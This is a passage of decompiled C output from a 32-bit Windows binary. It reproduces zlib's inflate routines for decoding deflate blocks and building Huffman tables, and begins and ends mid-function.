      *(uint **)(puVar3 + 8) = param_1;
      *(undefined **)(puVar3 + 7) = puVar10;
      *(undefined4 **)(param_2 + 1) = local_34;
      param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
      *(undefined4 **)param_2 = puVar14;
      *(undefined4 **)(puVar3 + 0xd) = local_30;
      FUN_0040dda0((int)puVar3,(int)param_2,-2);
      return;
    }
    puVar11 = puVar10;
    switch((&switchdataD_0040f414)[uVar5]) {
    case (undefined *)0x40e8aa:
      while (puVar10 < (undefined *)0x3) {
        if (local_34 == (undefined4 *)0x0) {
          *(undefined **)(puVar3 + 7) = puVar10;
          *(uint **)(puVar3 + 8) = param_1;
          param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
          param_2[1] = (byte *)0x0;
          *(undefined4 **)param_2 = puVar14;
          *(undefined4 **)(puVar3 + 0xd) = local_30;
          FUN_0040dda0((int)puVar3,(int)param_2,param_3);
          return;
        }
        local_34 = (undefined4 *)((int)local_34 + -1);
        param_3 = 0;
        param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
        puVar14 = (undefined4 *)((int)puVar14 + 1);
        puVar10 = puVar10 + 8;
      }
      puVar3[6] = (uint)param_1 & 1;
      local_28 = puVar14;
      switch(((uint)param_1 & 7) >> 1) {
      case 0:
        *puVar3 = 1;
        uVar5 = (uint)(puVar10 + -3) & 7;
        param_1 = (uint *)(((uint)param_1 >> 3) >> (sbyte)uVar5);
        puVar10 = puVar10 + -3 + -uVar5;
        break;
      case 1:
        FUN_0040fb90(&local_10,&local_14,&local_18,&local_1c);
        uVar5 = FUN_0040def0((char)local_10,(char)local_14,local_18,local_1c,(int)param_2);
        puVar3[1] = uVar5;
        if (uVar5 == 0) goto LAB_0040f2f4;
        *puVar3 = 6;
        param_1 = (uint *)((uint)param_1 >> 3);
        puVar10 = puVar10 + -3;
        break;
      case 2:
        param_1 = (uint *)((uint)param_1 >> 3);
        puVar10 = puVar10 + -3;
        *puVar3 = 3;
        break;
      case 3:
        *puVar3 = 9;
        *(char **)(param_2 + 6) = s_invalid_block_type_004215c0;
        puVar3[8] = (uint)param_1 >> 3;
        puVar10 = puVar10 + -3;
LAB_0040f135:
        *(undefined **)(puVar3 + 7) = puVar10;
        *(undefined4 **)(param_2 + 1) = local_34;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
        *(undefined4 **)param_2 = puVar14;
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,-3);
        return;
      }
      break;
    case (undefined *)0x40e992:
      while (puVar10 < (undefined *)0x20) {
        if (local_34 == (undefined4 *)0x0) {
LAB_0040f207:
          *(undefined **)(puVar3 + 7) = puVar10;
          *(uint **)(puVar3 + 8) = param_1;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
          *(undefined4 **)param_2 = puVar14;
          *(undefined4 **)(puVar3 + 0xd) = local_30;
          FUN_0040dda0((int)puVar3,(int)param_2,param_3);
          return;
        }
        local_34 = (undefined4 *)((int)local_34 + -1);
        param_3 = 0;
        param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
        puVar14 = (undefined4 *)((int)puVar14 + 1);
        puVar10 = puVar10 + 8;
      }
      uVar5 = (uint)param_1 & 0xffff;
      if (~(uint)param_1 >> 0x10 != uVar5) {
        *puVar3 = 9;
        *(char **)(param_2 + 6) = s_invalid_stored_block_lengths_004215a0;
        *(uint **)(puVar3 + 8) = param_1;
        *(undefined **)(puVar3 + 7) = puVar10;
        *(undefined4 **)(param_2 + 1) = local_34;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
        *(undefined4 **)param_2 = puVar14;
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,-3);
        return;
      }
      puVar10 = (undefined *)0x0;
      puVar3[1] = uVar5;
      param_1 = (uint *)0x0;
      local_28 = puVar14;
      if (uVar5 == 0) {
LAB_0040eb25:
        *puVar3 = -(uint)(puVar3[6] != 0) & 7;
      }
      else {
        *puVar3 = 2;
      }
      break;
    case (undefined *)0x40ea01:
      if (local_34 == (undefined4 *)0x0) {
LAB_0040f1c8:
        *(undefined **)(puVar3 + 7) = puVar10;
        *(uint **)(puVar3 + 8) = param_1;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
        param_2[1] = (byte *)0x0;
        *(undefined4 **)param_2 = puVar14;
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,param_3);
        return;
      }
      if (local_2c == (undefined4 *)0x0) {
        if (local_30 == (undefined4 *)puVar3[0xb]) {
          local_2c = (undefined4 *)puVar3[0xc];
          puVar4 = (undefined4 *)puVar3[10];
          if (puVar4 != local_2c) {
            if (puVar4 < local_2c) {
              local_2c = (undefined4 *)((int)local_2c + (-1 - (int)puVar4));
            }
            else {
              local_2c = (undefined4 *)((int)(undefined4 *)puVar3[0xb] - (int)puVar4);
            }
            local_30 = puVar4;
            if (local_2c != (undefined4 *)0x0) goto LAB_0040eabc;
          }
        }
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        iVar7 = FUN_0040dda0((int)puVar3,(int)param_2,param_3);
        local_20 = (undefined4 *)puVar3[0xc];
        local_30 = (undefined4 *)puVar3[0xd];
        if (local_30 < local_20) {
          local_2c = (undefined4 *)((int)local_20 + (-1 - (int)local_30));
        }
        else {
          local_2c = (undefined4 *)(puVar3[0xb] - (int)local_30);
        }
        local_24 = (undefined4 *)puVar3[0xb];
        if (local_30 == local_24) {
          puVar4 = (undefined4 *)puVar3[10];
          if (puVar4 != local_20) {
            local_30 = puVar4;
            if (puVar4 < local_20) {
              local_2c = (undefined4 *)((int)local_20 + (-1 - (int)puVar4));
            }
            else {
              local_2c = (undefined4 *)((int)local_24 - (int)puVar4);
            }
          }
        }
        if (local_2c == (undefined4 *)0x0) {
          *(uint **)(puVar3 + 8) = param_1;
          *(undefined **)(puVar3 + 7) = puVar10;
          pbVar2 = *param_2;
          *(undefined4 **)(param_2 + 1) = local_34;
          *(undefined4 **)param_2 = puVar14;
          param_2[2] = param_2[2] + (int)((int)puVar14 - (int)pbVar2);
          *(undefined4 **)(puVar3 + 0xd) = local_30;
          FUN_0040dda0((int)puVar3,(int)param_2,iVar7);
          return;
        }
      }
LAB_0040eabc:
      param_3 = 0;
      puVar4 = (undefined4 *)puVar3[1];
      if (local_34 < (undefined4 *)puVar3[1]) {
        puVar4 = local_34;
      }
      if (local_2c < puVar4) {
        puVar4 = local_2c;
      }
      uVar5 = (uint)puVar4 >> 2;
      puVar12 = puVar14;
      puVar13 = local_30;
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        *puVar13 = *puVar12;
        puVar12 = puVar12 + 1;
        puVar13 = puVar13 + 1;
      }
      uVar5 = (uint)puVar4 & 3;
      local_2c = (undefined4 *)((int)local_2c - (int)puVar4);
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        *(undefined *)puVar13 = *(undefined *)puVar12;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        puVar13 = (undefined4 *)((int)puVar13 + 1);
      }
      uVar5 = puVar3[1];
      local_34 = (undefined4 *)((int)local_34 - (int)puVar4);
      local_30 = (undefined4 *)((int)local_30 + (int)puVar4);
      puVar3[1] = uVar5 - (int)puVar4;
      local_28 = (undefined4 *)((int)puVar14 + (int)puVar4);
      if (uVar5 - (int)puVar4 == 0) goto LAB_0040eb25;
      break;
    case (undefined *)0x40eb36:
      while (puVar10 < (undefined *)0xe) {
        if (local_34 == (undefined4 *)0x0) goto LAB_0040f207;
        local_34 = (undefined4 *)((int)local_34 + -1);
        param_3 = 0;
        param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
        puVar14 = (undefined4 *)((int)puVar14 + 1);
        puVar10 = puVar10 + 8;
      }
      puVar3[1] = (uint)param_1 & 0x3fff;
      if ((0x1d < ((uint)param_1 & 0x1f)) || (0x3a0 < ((uint)param_1 & 0x3e0))) {
        *puVar3 = 9;
        *(char **)(param_2 + 6) = s_too_many_length_or_distance_symb_0042157c;
        *(uint **)(puVar3 + 8) = param_1;
        goto LAB_0040f135;
      }
      uVar5 = (*(code *)param_2[8])
                        (param_2[10],
                         (((uint)param_1 & 0x3fff) >> 5 & 0x1f) + 0x102 + ((uint)param_1 & 0x1f),4);
      puVar3[3] = uVar5;
      if (uVar5 == 0) {
        *(uint **)(puVar3 + 8) = param_1;
        *(undefined **)(puVar3 + 7) = puVar10;
        *(undefined4 **)(param_2 + 1) = local_34;
        pbVar2 = *param_2;
        *(undefined4 **)param_2 = puVar14;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)pbVar2);
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,-4);
        return;
      }
      param_1 = (uint *)((uint)param_1 >> 0xe);
      puVar10 = puVar10 + -0xe;
      puVar3[2] = 0;
      *puVar3 = 4;
    case (undefined *)0x40ebdb:
      if (puVar3[2] < (puVar3[1] >> 10) + 4) {
        do {
          while (puVar10 < (undefined *)0x3) {
            if (local_34 == (undefined4 *)0x0) goto LAB_0040f207;
            local_34 = (undefined4 *)((int)local_34 + -1);
            param_3 = 0;
            param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
            puVar14 = (undefined4 *)((int)puVar14 + 1);
            puVar10 = puVar10 + 8;
          }
          puVar10 = puVar10 + -3;
          *(uint *)(puVar3[3] + *(int *)(&DAT_0041b3a8 + puVar3[2] * 4) * 4) = (uint)param_1 & 7;
          uVar5 = puVar3[2];
          puVar3[2] = uVar5 + 1;
          param_1 = (uint *)((uint)param_1 >> 3);
        } while (uVar5 + 1 < (puVar3[1] >> 10) + 4);
      }
      uVar5 = puVar3[2];
      while (uVar5 < 0x13) {
        *(undefined4 *)(puVar3[3] + *(int *)(&DAT_0041b3a8 + puVar3[2] * 4) * 4) = 0;
        uVar5 = puVar3[2] + 1;
        puVar3[2] = uVar5;
      }
      puVar3[4] = 7;
      local_28 = (undefined4 *)
                 FUN_0040f950((int *)puVar3[3],puVar3 + 4,puVar3 + 5,puVar3[9],(int)param_2);
      if (local_28 != (undefined4 *)0x0) {
        if (local_28 == (undefined4 *)0xfffffffd) {
          (*(code *)param_2[9])(param_2[10],puVar3[3]);
          *puVar3 = 9;
          *(uint **)(puVar3 + 8) = param_1;
          *(undefined **)(puVar3 + 7) = puVar10;
          *(undefined4 **)(param_2 + 1) = local_34;
          param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
          *(undefined4 **)param_2 = puVar14;
          *(undefined4 **)(puVar3 + 0xd) = local_30;
          FUN_0040dda0((int)puVar3,(int)param_2,-3);
          return;
        }
LAB_0040f2b5:
        *(uint **)(puVar3 + 8) = param_1;
        *(undefined **)(puVar3 + 7) = puVar10;
        *(undefined4 **)(param_2 + 1) = local_34;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
        *(undefined4 **)param_2 = puVar14;
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,(int)local_28);
        return;
      }
      puVar3[2] = 0;
      *puVar3 = 5;
      puVar11 = puVar10;
switchD_0040e8a3_caseD_40ecc0:
      if (puVar3[2] < (puVar3[1] >> 5 & 0x1f) + 0x102 + (puVar3[1] & 0x1f)) {
        do {
          puVar8 = (undefined *)puVar3[4];
          puVar10 = puVar11;
          if (puVar11 < puVar8) {
            do {
              if (local_34 == (undefined4 *)0x0) goto LAB_0040f1c8;
              local_34 = (undefined4 *)((int)local_34 + -1);
              puVar11 = puVar10 + 8;
              param_3 = 0;
              puVar8 = (undefined *)puVar3[4];
              param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
              puVar14 = (undefined4 *)((int)puVar14 + 1);
              puVar10 = puVar11;
            } while (puVar11 < puVar8);
          }
          iVar7 = puVar3[5] + (*(uint *)(&DAT_0041a260 + (int)puVar8 * 4) & (uint)param_1) * 8;
          bVar1 = *(byte *)(iVar7 + 1);
          uVar5 = (uint)bVar1;
          local_20 = *(undefined4 **)(iVar7 + 4);
          if (local_20 < (undefined4 *)0x10) {
            param_1 = (uint *)((uint)param_1 >> (bVar1 & 0x1f));
            puVar11 = puVar11 + -uVar5;
            *(undefined4 **)(puVar3[3] + puVar3[2] * 4) = local_20;
            uVar5 = puVar3[2] + 1;
          }
          else {
            if (local_20 == (undefined4 *)0x12) {
              local_2c = (undefined4 *)0x7;
            }
            else {
              local_2c = (undefined4 *)((int)local_20 + -0xe);
            }
            local_24 = (undefined4 *)((-(uint)(local_20 != (undefined4 *)0x12) & 0xfffffff8) + 0xb);
            local_c = (undefined *)local_2c + uVar5;
            puVar10 = puVar11;
            while (puVar10 < local_c) {
              if (local_34 == (undefined4 *)0x0) goto LAB_0040f207;
              local_34 = (undefined4 *)((int)local_34 + -1);
              param_3 = 0;
              param_1 = (uint *)((uint)param_1 | (uint)*(byte *)puVar14 << ((byte)puVar10 & 0x1f));
              puVar14 = (undefined4 *)((int)puVar14 + 1);
              puVar10 = puVar10 + 8;
            }
            uVar6 = (uint)param_1 >> (bVar1 & 0x1f);
            local_24 = (undefined4 *)
                       ((int)local_24 + (*(uint *)(&DAT_0041a260 + (int)local_2c * 4) & uVar6));
            param_1 = (uint *)(uVar6 >> ((byte)local_2c & 0x1f));
            puVar11 = puVar10 + -(int)((undefined *)local_2c + uVar5);
            uVar5 = puVar3[2];
            if ((puVar3[1] >> 5 & 0x1f) + 0x102 + (puVar3[1] & 0x1f) < (int)local_24 + uVar5) {
LAB_0040f246:
              (*(code *)param_2[9])(param_2[10],puVar3[3]);
              *puVar3 = 9;
              *(char **)(param_2 + 6) = s_invalid_bit_length_repeat_00421560;
              *(uint **)(puVar3 + 8) = param_1;
              *(undefined **)(puVar3 + 7) = puVar11;
              *(undefined4 **)(param_2 + 1) = local_34;
              param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
              *(undefined4 **)param_2 = puVar14;
              *(undefined4 **)(puVar3 + 0xd) = local_30;
              FUN_0040dda0((int)puVar3,(int)param_2,-3);
              return;
            }
            if (local_20 == (undefined4 *)0x10) {
              if (uVar5 == 0) goto LAB_0040f246;
              uVar9 = *(undefined4 *)((puVar3[3] - 4) + uVar5 * 4);
            }
            else {
              uVar9 = 0;
            }
            do {
              uVar5 = uVar5 + 1;
              *(undefined4 *)((puVar3[3] - 4) + uVar5 * 4) = uVar9;
              local_24 = (undefined4 *)((int)local_24 + -1);
            } while (local_24 != (undefined4 *)0x0);
          }
          puVar3[2] = uVar5;
        } while (puVar3[2] < (puVar3[1] >> 5 & 0x1f) + 0x102 + (puVar3[1] & 0x1f));
      }
      puVar3[5] = 0;
      local_24 = (undefined4 *)0x9;
      local_20 = (undefined4 *)0x6;
      local_28 = (undefined4 *)
                 FUN_0040fa00((puVar3[1] & 0x1f) + 0x101,(puVar3[1] >> 5 & 0x1f) + 1,
                              (int *)puVar3[3],(uint *)&local_24,(uint *)&local_20,&local_4,&local_8
                              ,puVar3[9],(int)param_2);
      puVar10 = puVar11;
      if (local_28 != (undefined4 *)0x0) {
        if (local_28 == (undefined4 *)0xfffffffd) {
          (*(code *)param_2[9])(param_2[10],puVar3[3]);
          *puVar3 = 9;
        }
        goto LAB_0040f2b5;
      }
      uVar5 = FUN_0040def0((char)local_24,(char)local_20,local_4,local_8,(int)param_2);
      if (uVar5 == 0) {
LAB_0040f2f4:
        *(uint **)(puVar3 + 8) = param_1;
        *(undefined **)(puVar3 + 7) = puVar10;
        *(undefined4 **)(param_2 + 1) = local_34;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
        *(undefined4 **)param_2 = puVar14;
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        FUN_0040dda0((int)puVar3,(int)param_2,-4);
        return;
      }
      puVar3[1] = uVar5;
      (*(code *)param_2[9])(param_2[10],puVar3[3]);
      *puVar3 = 6;
switchD_0040e8a3_caseD_40ef19:
      *(uint **)(puVar3 + 8) = param_1;
      *(undefined **)(puVar3 + 7) = puVar11;
      *(undefined4 **)(param_2 + 1) = local_34;
      param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
      *(undefined4 **)param_2 = puVar14;
      *(undefined4 **)(puVar3 + 0xd) = local_30;
      iVar7 = FUN_0040df30((uint)puVar3,param_2,param_3);
      if (iVar7 != 1) {
LAB_0040f382:
        FUN_0040dda0((int)puVar3,(int)param_2,iVar7);
        return;
      }
      param_3 = 0;
      FUN_0040e700(puVar3[1],(int)param_2);
      param_1 = (uint *)puVar3[8];
      local_30 = (undefined4 *)puVar3[0xd];
      puVar14 = (undefined4 *)*param_2;
      local_34 = (undefined4 *)param_2[1];
      puVar10 = (undefined *)puVar3[7];
      if (local_30 < (undefined4 *)puVar3[0xc]) {
        local_2c = (undefined4 *)((int)(undefined4 *)puVar3[0xc] + (-1 - (int)local_30));
      }
      else {
        local_2c = (undefined4 *)(puVar3[0xb] - (int)local_30);
      }
      if (puVar3[6] != 0) {
        *puVar3 = 7;
switchD_0040e8a3_caseD_40f336:
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        iVar7 = FUN_0040dda0((int)puVar3,(int)param_2,param_3);
        local_30 = (undefined4 *)puVar3[0xd];
        if ((undefined4 *)puVar3[0xc] == local_30) {
          *puVar3 = 8;
switchD_0040e8a3_caseD_40f39b:
          *(uint **)(puVar3 + 8) = param_1;
          *(undefined **)(puVar3 + 7) = puVar10;
          *(undefined4 **)(param_2 + 1) = local_34;
          param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
          *(undefined4 **)param_2 = puVar14;
          *(undefined4 **)(puVar3 + 0xd) = local_30;
          FUN_0040dda0((int)puVar3,(int)param_2,1);
          return;
        }
        *(uint **)(puVar3 + 8) = param_1;
        *(undefined **)(puVar3 + 7) = puVar10;
        pbVar2 = *param_2;
        *(undefined4 **)(param_2 + 1) = local_34;
        *(undefined4 **)param_2 = puVar14;
        param_2[2] = param_2[2] + (int)((int)puVar14 - (int)pbVar2);
        *(undefined4 **)(puVar3 + 0xd) = local_30;
        goto LAB_0040f382;
      }
      *puVar3 = 0;
      local_28 = puVar14;
      break;
    case (undefined *)0x40ecc0:
      goto switchD_0040e8a3_caseD_40ecc0;
    case (undefined *)0x40ef19:
      goto switchD_0040e8a3_caseD_40ef19;
    case (undefined *)0x40f336:
      goto switchD_0040e8a3_caseD_40f336;
    case (undefined *)0x40f39b:
      goto switchD_0040e8a3_caseD_40f39b;
    case (undefined *)0x40f3d7:
      *(uint **)(puVar3 + 8) = param_1;
      *(undefined **)(puVar3 + 7) = puVar10;
      *(undefined4 **)(param_2 + 1) = local_34;
      param_2[2] = param_2[2] + (int)((int)puVar14 - (int)*param_2);
      *(undefined4 **)param_2 = puVar14;
      *(undefined4 **)(puVar3 + 0xd) = local_30;
      FUN_0040dda0((int)puVar3,(int)param_2,-3);
      return;
    }
    uVar5 = *puVar3;
    puVar14 = local_28;
  } while( true );
}

undefined4 __cdecl FUN_0040f450(int *param_1,int param_2)

{
  FUN_0040e720(param_1,param_2,(int *)0x0);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[10]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[9]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return 0;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl
FUN_0040f490(int *param_1,uint param_2,uint param_3,int param_4,int param_5,uint *param_6,
            uint *param_7,int param_8,uint *param_9,uint *param_10)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  byte bVar6;
  int *piVar7;
  uint uVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  int iVar12;
  uint uVar13;
  int iVar14;
  uint uVar15;
  uint local_100;
  uint local_fc;
  int local_f8;
  uint *local_f4;
  int local_f0;
  uint *local_e8;
  undefined4 local_e0;
  uint local_dc;
  uint local_d8;
  uint local_d4;
  uint local_d0;
  uint local_bc [47];
  
  uVar15 = 0;
  local_bc[0] = 0;
  local_bc[1] = 0;
  local_bc[2] = 0;
  local_bc[3] = 0;
  local_bc[4] = 0;
  local_bc[5] = 0;
  local_bc[6] = 0;
  local_bc[7] = 0;
  local_bc[8] = 0;
  local_bc[9] = 0;
  local_bc[10] = 0;
  local_bc[11] = 0;
  local_bc[12] = 0;
  local_bc[13] = 0;
  local_bc[14] = 0;
  local_bc[15] = 0;
  piVar7 = param_1;
  uVar11 = param_2;
  do {
    iVar14 = *piVar7;
    piVar7 = piVar7 + 1;
    uVar11 = uVar11 - 1;
    local_bc[iVar14] = local_bc[iVar14] + 1;
  } while (uVar11 != 0);
  if (local_bc[0] == param_2) {
    *param_6 = 0;
    *param_7 = 0;
  }
  else {
    local_fc = 1;
    puVar5 = local_bc;
    do {
      puVar5 = puVar5 + 1;
      if (*puVar5 != 0) break;
      local_fc = local_fc + 1;
    } while (local_fc < 0x10);
    local_100 = *param_7;
    if (*param_7 < local_fc) {
      local_100 = local_fc;
    }
    uVar11 = 0xf;
    puVar5 = local_bc + 0xf;
    do {
      if (*puVar5 != 0) break;
      uVar11 = uVar11 - 1;
      puVar5 = puVar5 + -1;
    } while (uVar11 != 0);
    if (uVar11 < local_100) {
      local_100 = uVar11;
    }
    *param_7 = local_100;
    iVar14 = 1 << ((byte)local_fc & 0x1f);
    if (local_fc < uVar11) {
      puVar5 = local_bc + local_fc;
      uVar8 = local_fc;
      do {
        uVar4 = *puVar5;
        if ((int)(iVar14 - uVar4) < 0) {
          return 0xfffffffd;
        }
        uVar8 = uVar8 + 1;
        puVar5 = puVar5 + 1;
        iVar14 = (iVar14 - uVar4) * 2;
      } while (uVar8 < uVar11);
    }
    iVar14 = iVar14 - local_bc[uVar11];
    if (iVar14 < 0) {
      return 0xfffffffd;
    }
    local_bc[17] = 0;
    local_bc[uVar11] = local_bc[uVar11] + iVar14;
    iVar9 = 0;
    iVar12 = uVar11 - 1;
    if (iVar12 != 0) {
      iVar2 = 0;
      do {
        iVar9 = iVar9 + *(int *)((int)local_bc + iVar2 + 4);
        iVar12 = iVar12 + -1;
        *(int *)((int)local_bc + iVar2 + 0x48) = iVar9;
        iVar2 = iVar2 + 4;
      } while (iVar12 != 0);
    }
    uVar8 = 0;
    do {
      iVar9 = *param_1;
      param_1 = param_1 + 1;
      if (iVar9 != 0) {
        uVar4 = local_bc[iVar9 + 0x10];
        param_10[uVar4] = uVar8;
        local_bc[iVar9 + 0x10] = uVar4 + 1;
      }
      uVar8 = uVar8 + 1;
    } while (uVar8 < param_2);
    iVar9 = -local_100;
    uVar8 = local_bc[uVar11 + 0x10];
    local_f4 = param_10;
    local_d8 = 0;
    local_bc[16] = 0;
    local_f8 = -1;
    local_bc[32] = 0;
    local_d0 = 0;
    local_d4 = 0;
    if ((int)local_fc <= (int)uVar11) {
      local_f0 = local_fc - 1;
      local_e8 = local_bc + local_fc;
      do {
        uVar4 = *local_e8;
        while (uVar4 != 0) {
          uVar13 = uVar4 - 1;
          local_e0._2_2_ = (undefined2)(local_e0 >> 0x10);
          iVar12 = iVar9;
          while (iVar12 = iVar12 + local_100, iVar12 < (int)local_fc) {
            iVar9 = iVar9 + local_100;
            uVar15 = uVar11 - iVar9;
            if (local_100 < uVar11 - iVar9) {
              uVar15 = local_100;
            }
            uVar10 = local_fc - iVar9;
            bVar6 = (byte)uVar10;
            uVar1 = 1 << (bVar6 & 0x1f);
            if ((uVar4 < uVar1) && (iVar2 = uVar1 + (-1 - uVar13), uVar10 < uVar15)) {
              uVar10 = uVar10 + 1;
              bVar6 = (byte)uVar10;
              puVar5 = local_e8;
              while (uVar10 < uVar15) {
                bVar6 = (byte)uVar10;
                uVar1 = puVar5[1];
                puVar5 = puVar5 + 1;
                uVar3 = iVar2 * 2;
                if (uVar3 < uVar1 || uVar3 - uVar1 == 0) break;
                iVar2 = uVar3 - uVar1;
                uVar10 = uVar10 + 1;
                bVar6 = (byte)uVar10;
              }
            }
            local_d4 = 1 << (bVar6 & 0x1f);
            uVar15 = *param_9;
            uVar10 = local_d4 + uVar15;
            if (0x5a0 < uVar10) {
              return 0xfffffffd;
            }
            *param_9 = uVar10;
            local_d0 = param_8 + uVar15 * 8;
            local_bc[local_f8 + 0x21] = local_d0;
            if (local_f8 + 1 == 0) {
              *param_6 = local_d0;
            }
            else {
              local_bc[local_f8 + 0x11] = local_d8;
              local_e0._0_2_ = CONCAT11((char)local_100,bVar6);
              local_e0 = local_e0 & 0xffff0000 | (uint)(ushort)local_e0;
              uVar10 = local_d8 >> ((char)iVar9 - (char)local_100 & 0x1fU);
              uVar15 = local_bc[local_f8 + 0x20];
              local_dc = ((int)(local_d0 - uVar15) >> 3) - uVar10;
              *(uint *)(uVar15 + uVar10 * 8) = local_e0;
              *(uint *)(uVar15 + 4 + uVar10 * 8) = local_dc;
            }
            uVar15 = local_d8;
            local_f8 = local_f8 + 1;
          }
          bVar6 = (byte)iVar9;
          if (local_f4 < param_10 + uVar8) {
            local_dc = *local_f4;
            if (local_dc < param_3) {
              local_e0._0_1_ = (-(local_dc < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar12 = (local_dc - param_3) * 4;
              local_e0._0_1_ = *(char *)(iVar12 + param_5) + 'P';
              local_dc = *(uint *)(iVar12 + param_4);
            }
            local_f4 = local_f4 + 1;
          }
          else {
            local_e0._0_1_ = -0x40;
          }
          local_e0 = CONCAT31(CONCAT21(local_e0._2_2_,(char)local_fc - bVar6),(char)local_e0);
          iVar12 = 1 << ((char)local_fc - bVar6 & 0x1f);
          uVar4 = uVar15 >> (bVar6 & 0x1f);
          if (uVar4 < local_d4) {
            puVar5 = (uint *)(local_d0 + uVar4 * 8);
            do {
              uVar4 = uVar4 + iVar12;
              *puVar5 = local_e0;
              puVar5[1] = local_dc;
              puVar5 = puVar5 + iVar12 * 2;
            } while (uVar4 < local_d4);
          }
          uVar10 = 1 << ((byte)local_f0 & 0x1f);
          uVar4 = uVar15 & uVar10;
          while (uVar4 != 0) {
            uVar15 = uVar15 ^ uVar10;
            uVar10 = uVar10 >> 1;
            uVar4 = uVar15 & uVar10;
          }
          uVar15 = uVar15 ^ uVar10;
          puVar5 = local_bc + local_f8 + 0x10;
          uVar4 = uVar13;
          local_d8 = uVar15;
          if (((1 << (bVar6 & 0x1f)) - 1U & uVar15) != local_bc[local_f8 + 0x10]) {
            do {
              local_f8 = local_f8 + -1;
              iVar9 = iVar9 - local_100;
              puVar5 = puVar5 + -1;
            } while (((1 << ((byte)iVar9 & 0x1f)) - 1U & uVar15) != *puVar5);
          }
        }
        local_e8 = local_e8 + 1;
        local_fc = local_fc + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_fc <= (int)uVar11);
    }
    if ((iVar14 != 0) && (uVar11 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}

int __cdecl FUN_0040f950(int *param_1,uint *param_2,uint *param_3,int param_4,int param_5)

{
  uint *puVar1;
  int iVar2;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_0040f490(param_1,0x13,0x13,0,0,param_3,param_2,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(undefined4 *)(param_5 + 0x18) = 0x4215f8;
    (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),puVar1);
    return -3;
  }
  if ((iVar2 == -5) || (*param_2 == 0)) {
    *(undefined4 *)(param_5 + 0x18) = 0x4215d4;
    iVar2 = -3;
  }
  (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),puVar1);
  return iVar2;
}

int __cdecl
FUN_0040fa00(uint param_1,uint param_2,int *param_3,uint *param_4,uint *param_5,uint *param_6,
            uint *param_7,int param_8,int param_9)

{
  uint *puVar1;
  int iVar2;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(param_9 + 0x20))(*(undefined4 *)(param_9 + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_0040f490(param_3,param_1,0x101,(int)&DAT_0041b424,(int)&DAT_0041b4a0,param_6,param_4,
                       param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_0040f490(param_3 + param_1,param_2,0,(int)&DAT_0041b51c,(int)&DAT_0041b594,param_7
                           ,param_5,param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(undefined4 *)(param_9 + 0x18) = 0x4216a4;
          (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(undefined4 *)(param_9 + 0x18) = 0x421688;
          (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_0040fb33;
      }
      *(undefined4 *)(param_9 + 0x18) = 0x421664;
      iVar2 = -3;
LAB_0040fb33:
